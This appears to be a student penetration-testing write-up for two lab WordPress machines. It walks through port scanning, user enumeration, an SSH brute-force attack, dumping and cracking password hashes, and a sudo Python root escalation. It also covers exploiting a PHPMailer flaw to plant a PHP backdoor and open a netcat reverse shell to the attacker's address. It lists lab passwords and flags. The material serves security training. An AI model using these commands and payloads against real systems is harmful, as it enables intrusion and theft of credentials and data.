# Offensive: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

Command: `$ nmap -sV 192.168.1.110` or `$ nmap -A 192.168.1.0/24`

Output screenshot:

![Nmap 192 168 1 110](https://user-images.githubusercontent.com/85250007/174417286-7bd90ba5-e3cc-4109-abbd-e90624366fd9.gif)

This scan identifies the services below as potential points of entry:
**Target 1**
1. Port 22/TCP 	  Open 	SSH
2. Port 80/TCP 	  Open 	HTTP
3. Port 111/TCP 	Open 	rcpbind
4. Port 139/TCP 	Open 	netbios-ssn
5. Port 445/TCP 	Open 	netbios-ssn

### Critical Vulnerabilities
The following vulnerabilities were identified on each target:

**Target 1**
1. User Enumeration (WordPress site)
2. Weak User Password
3. Unsalted User Password Hash (WordPress database)
4. Misconfiguration of Python root User Privileges/Privilege Escalation
5. Improper configured SSH
6. No file security permission implemented



### Exploitation

The Offensive Team was able to penetrate `Target 1` and retrieve the following confidential data:
![save hashes and john the ripper them](https://user-images.githubusercontent.com/85250007/174421418-5f25f299-fe7a-4d8e-aa22-e4189bef7611.gif)

**Target 1**

- `Flag1: b9bbcb33ellb80be759c4e844862482d`

    - Exploit Used:
    - WPScan to enumerate users of the Target 1 WordPress site
    - Command: 
      - `$ wpscan --url http://192.168.1.110 --enumerate u`
 
 ![wpscanusers](https://user-images.githubusercontent.com/85250007/174419133-b072d0ae-c9c0-40c6-a6fa-336cf80698a3.png)
![Flag3](https://user-images.githubusercontent.com/85250007/174421144-315b9c85-f4da-4ce8-9837-9a3e52fbf809.gif)

   - Targeting User Michael
   - Executed Hydra Brute Force Attack
   - The following command was performed:
   -`hydra -l michael -P /usr/share/wordlists/rockyou.txt 192.168.1.110 ssh`
   - Password: Michael  
      
 ![Hydra brute Force](https://user-images.githubusercontent.com/85250007/174419194-4f8ce1aa-0f58-4f03-8433-d197edae8103.gif)

   - Capturing Flag 1: After SSH Brute Force Attack as Michael I traversed through directories and files.
   - Found Flag1 in  var/www/html folder at root in service.html in a HTML comment below the footer.
   - Commands:
        - `ssh michael@192.168.1.110`
        - `pw: michael`
        - `cd ../`
        - `cd ../`
        - `cd var/www/html`
        - `ls -l`
        - `nano service.html` 
        
![flag1](https://user-images.githubusercontent.com/85250007/174420761-94970862-acd1-4670-8d90-42a95f56fb4a.gif)


![Signin as Michael](https://user-images.githubusercontent.com/85250007/174419456-412018fe-aa33-4a1f-a433-6f23bf088b67.gif)

- `Flag2: fc3fd58dcdad9ab23faca6e9a3e581c`

   - Exploit Used:
   - Same exploit used to gain Flag 1.
   - Capturing Flag 2: While SSH in as user Michael Flag 2 was also found.
   - Once again traversing through directories and files as before Flag 2 was found in /var/www next to the html folder that held Flag 1.
   - Commands:
        - `ssh michael@192.168.1.110`
        - `pw: michael`
        - `cd ../`
        - `cd /var/www`
        - `find / i-name flag*`
        - `cat flag2.txt`

![Flag2](https://user-images.githubusercontent.com/85250007/174420694-4b41f777-5fa1-41d8-9588-77dd30409745.gif)

- `Flag3: afc01ab56b50591e7dccf93122770cd2`

    - Exploit Used:
    - Previous exploits used to gain Flag 1 and 2.
    - Capturing Flag 3: Accessing MySQL database.
    - Once having found wp-config.php and gaining access to the database credentials as Michael, MySQL was used to explore the database.
    - The wp-config.php displayed DB_Password in plaintext

![wp-configphp](https://user-images.githubusercontent.com/85250007/174420457-36498526-cf68-47e0-8563-9343d0a29da4.png)
      
   - Flag 3 was found in wp_posts table in the wordpress database.
   - Commands:
        - Connected to mysql: -u root -p R@v3nSecurity
          - `show databases;`
          - `use wordpress;`
          - `show tables;`
          - `select * from wp_posts;`

![Flag3](https://user-images.githubusercontent.com/85250007/174421155-f1f7ff1e-e7f7-469c-b48d-6a70d6e203a4.gif)

- `Flag4: 715dea6c055b9fe3337544932f2941ce`

    - Exploit Used:
    - Unsalted password hash and the use of privilege escalation with Python.
    - Capturing Flag 4: Retrieve user credentials from database, crack password hash with John the Ripper and use Python to gain root privileges.
    - Once having gained access to the database credentials as Michael from the wp-config.php file, lifting username and password hashes using MySQL was next. 
    - These user credentials are stored in the wp_users table of the wordpress database. The usernames and password hashes were copied/saved to the Kali machine in a file called wp_hashes.txt.
    - Commands:
         - `mysql -u root -p’R@v3nSecurity’ -h 127.0.0.1` 
         - `show databases;`
         - `use wordpress;` 
         - `show tables;`
         - `select * from wp_users;`

![mysql hashes found](https://user-images.githubusercontent.com/85250007/174421618-027c6170-266b-48e3-8432-ca68e7429c39.gif)

   - On the Kali local machine the wp_hashes.txt was run against John the Ripper to crack the hashes. 
   - Command:
        -`john wp_hashes.txt`
        
![save hashes and john the ripper them](https://user-images.githubusercontent.com/85250007/174421455-b1fed644-0b18-4c8f-9945-2b914db2048f.gif)

   - Once Steven’s password hash was cracked, the next thing to do was SSH as Steven. Then as Steven checking for privilege and escalating to root with Python
   - Commands: 
       - `ssh steven@192.168.1.110`
          - `pw:pink84`
          - `sudo -l`
          - `sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’`
          - `cd /root`
          - `ls`
          - `cat flag4.txt`

![Flag4](https://user-images.githubusercontent.com/85250007/174421352-a1c816d0-7442-40ac-aeed-8d4b2c66d8f9.gif)










### Exposed Services

Target 2 exposes the same WordPress site as Target 1, but with better security hardning. Therefore, it must be exploited differently that target 1. The steps for completing this assessment are enumerated below. All details required to capture the first three flags on Target 2 are included.

Commands: Escalate to root with `sudo su` and the `Run /opt/setup`

![Setup root](https://user-images.githubusercontent.com/85250007/177842268-26052eb7-0b01-4a42-9a71-332317e02b29.gif)

Nmap scan results for each machine reveal the below services and OS details:

Command: `$ nmap -A 192.168.1.*` or `$ nmap -sV 192.168.1.115`

Output screenshot:

![Nmap 192 168 1 115](https://user-images.githubusercontent.com/85250007/177840106-c8cdb6f7-295e-42e2-bfb2-38e0ada633ac.gif)


This scan identifies the services below as potential points of entry:
**Target 2**
1. Port 22/TCP 	  Open 	SSH
2. Port 80/TCP 	  Open 	HTTP
3. Port 111/TCP 	Open 	rcpbind
4. Port 139/TCP 	Open 	netbios-ssn
5. Port 445/TCP 	Open 	netbios-ssn

The following vulnerabilites were identified on Target 2:
1. CVE-2016-10033 (Remote Code Execution Vulnerability in PHPMailer)
2. CVE-2021-28041 open SSH
3. CVE-2017-15710 Apache https 2.4.10
4. CVE-2017-8779 exploit on open rpcbind port could lead to remote DoS
5. CVE-2017-7494 Samba NetBIOS


### Critical Vulnerabilities
The following vulnerabilities were identified on each target:

**Target 2**
1. CVE-2016-10033 (Remote Code Execution Vulnerability in PHPMailer 5.2.16)
2. Network Mapping and User Enumeration (WordPress site)
3. Misconfiguration of User Privileges/Privilege Escalation
4. Weak Root Password
     


### Exploitation

The Offensive Team was able to penetrate `Target 2` and retrieve the following confidential data:

**Target 2**

- `Flag1: a2c1f66d2b8051bd3a5874b5b6e43e21`

    - Exploit Used:
    - Enumerated WordPress site with Nikto and Gobuster to create a list of exposed URLs from the target HTTP server and gather version info.
    - Command: 
      - `nikto -C all -h 192.168.1.115`
 
![Nikto](https://user-images.githubusercontent.com/85250007/177843573-68ee3408-d726-4166-8c12-4a09bbaad444.gif)

   - Determined the website is running on Apache/2.4.0 (Debian).
   - Performed a more in-depth enumeration with Gobuster.
   - Commands:
     - `apt-get-update`
     - `apt install gobuster`
     - `gobuster -w /usr/share/wordlists/disbuster/directory-list-2.3-medium/txt dir -u 192.168.1.115`

![Apt Get Update](https://user-images.githubusercontent.com/85250007/177845805-08ab33e8-ffc1-4822-99e4-01a7a126cbb0.gif)

![Apt install gobuster](https://user-images.githubusercontent.com/85250007/177845806-bd79adfc-4204-4a65-8a51-ba8721b1d0be.gif)

![Gobusting](https://user-images.githubusercontent.com/85250007/177845803-06c3bfa8-6f12-4616-9dde-5145257a7023.gif)

The PATH file in the Vendor Directory was modified recently compare to the other files.
Subsequent investigation of the file reveled Flag 1.

![Flag1](https://user-images.githubusercontent.com/85250007/177843725-137ef889-48c5-45a2-b626-0133975ca006.gif)

Investigated the VERSION file and discoverd the PHPMailer version being used is 5.2.16

![VERSION](https://user-images.githubusercontent.com/85250007/177847353-09ca3d6e-82d2-41ba-b7c1-e7da9727a967.gif)

Investigated the SECURITY.md file and identified CVE-2016-10033 (Remote Code Execution Vulnerabilty) as a potential exploit for PHPMailer version 5.2.16. 

As well, it looks as if the site is also using PHPMailer 5.2.16

![SECURITY](https://user-images.githubusercontent.com/85250007/177849262-2b82ea07-9221-48af-b879-9d75bf92a7b2.gif)

- `Flag2: 6a8ed560f0b5358ecf844108048eb337`

 - Exploit Used:
    - Used Searchsploit to find vulnerability associate with PHPMail 5.2.16, exploited with bash script to open backdoor on target, and open reverse shell on target with Ncat Listener.
    - Command: 
     - `nc -lnvp 4444`
     - `nc 192.168.1.90 4444 -e /bin/bash`
     - URL `192.168.1.115/backdoor.php?cmd=nc%20192.168.1.90%204444%20-e%20/bin/bash`
     - Used Searchsploit to find any known vulneratbilities associated with PHPMailer.
    - Command: 
     - `searchsploit phpmailer`

![SearchSploit](https://user-images.githubusercontent.com/85250007/177851350-9393bdb3-e297-4916-bb97-23eaa32a6dfe.gif)

- Confirmed exploit 40970.php matched with CVE-2016-10033 and PHPMailer version 5.2.16
    - Command: 
     - `searchsploit -x /usr/share/exploitdb/exploits/php/webapps/40970.php`

![searchsploit webapps](https://user-images.githubusercontent.com/85250007/177852084-be51e1fb-ed42-4ac2-bfb4-af39685f1494.gif)

- Used the script exploit.sh to exploit the vulnerability by opening a Ncat connection to attach kali VM.

![Exploit sh](https://user-images.githubusercontent.com/85250007/177852855-714385f9-38be-4845-a0c9-8b1a37fb727c.gif)

- Ran the script and uploaded the file backdoor.php to the target server to allow command injection attacks to be executed.
    - Command: 
     - `bash exploit.sh`

![Bash Exploit sh](https://user-images.githubusercontent.com/85250007/177853263-ba0580e5-1c36-43b6-90ce-1e45b664505a.gif)

- Navigating to 192.168.1.115/backdoor.php?cmd=<CMD> now allow bash commands to be executed on target 2.
   - URL: 192.168.1.115/backdoor.php?cmd=cat%20/etc/passwd
    
- Used the backdoor to open a reverse shell session on the target with Ncat listener and command injection in the browser.
   - Started Ncat listener on he attacking Kali VM
    - `nc -lnvp 4444`
    
![4444](https://user-images.githubusercontent.com/85250007/177855001-b55ca07e-09cf-4367-b378-4ff53ca791c0.gif)

- In the browser, use the backdoor to run commands and opne a reverse shell on the target.
    - Command: 
     - `b=nc 192.168.1.90 4444 -e /bin/bash`
     - URL: 192.168.1.115/backdoor.php?cmd=nc%20192.168.1.90%204444%20-e%20/bin/bash
    



